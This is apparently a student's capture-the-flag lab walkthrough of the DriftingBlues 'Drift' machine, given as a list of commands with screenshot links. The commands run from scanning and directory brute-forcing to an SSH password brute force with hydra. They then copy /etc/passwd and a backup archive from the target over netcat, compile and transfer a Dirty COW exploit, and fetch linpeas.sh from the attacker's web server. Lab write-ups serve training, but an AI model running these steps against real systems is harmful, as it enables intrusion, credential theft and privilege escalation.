# Drift 192.168.56.106
## Andrea Zonnekus 18758119

sudo netdiscover -i eth0

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.001.png)

sudo nmap --vv -sS -sV --script="default or safe" 192.168.56.106 -Pn -oN host

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.002.png)

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.003.png)

sudo nmap --vv -sS -O --script="default or safe" 192.168.56.106 -Pn -oN os



dirb http://192.168.56.106 -o dirb -format text

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.004.png)

nikto -host http://192.168.56.106 -o nikto -Format text

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.005.png)



msfconsole

scanner/ssh/ssh\_enumusers

set user ssh

set user\_file /usr/share/legion/wordlists/ssh-user.txt

run

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.006.png)

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.007.png)

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.008.png)

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.009.png)

gobuster dir -u http://192.168.56.106 -x html,txt,php,bak --wordlist=/usr/share/wordlists/dirb/common.txt

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.010.png)

use a guide to find

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.011.png)

sudo gobuster vhost -u driftingblues.box --wordlist /usr/share/wordlists/dirb/common.txt

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.012.png)

sudo gobuster dir -u test.driftingblues.box --wordlist /usr/share/wordlists/dirb/common.txt

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.013.png)

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.014.png)

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.015.png)

hydra ssh://192.168.56.106:22 -L ssh\_users -P password -o brute -t 8

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.016.png)

sudo ssh <eric@test.driftingblues.box>

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.017.png)

cat user.txt

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.018.png)

ping 192.168.56.102

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.019.png)

nc -lvp 666 >> backup.zip

nc 192.168.56.102 666 < /tmp/backup.zip

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.020.png)

nc -lvp 666 >> passwd

nc 192.168.56.102 666 < /etc/passwd

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.021.png)

lscpu

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.022.png)

sudo python3 -m http.server 80

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.023.png)



sudo gcc dirty32.c -o cow32 -pthread

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.024.png)

sudo chmod +x cow32

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.025.png)

nc 192.168.56.106 4444 < cow32

nc -lvp 4444 >> cow32

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.026.png)

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.027.png)

wget http://192.168.56.102:80/linpeas.sh

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.028.png)



wget <http://192.168.56.102:80/linpeas.sh>

./pspy32

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.029.png)

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.030.png)

![](drift_steps/Aspose.Words.8ee8a32b-7ed2-442c-b44e-1b67ea26dd77.031.png)
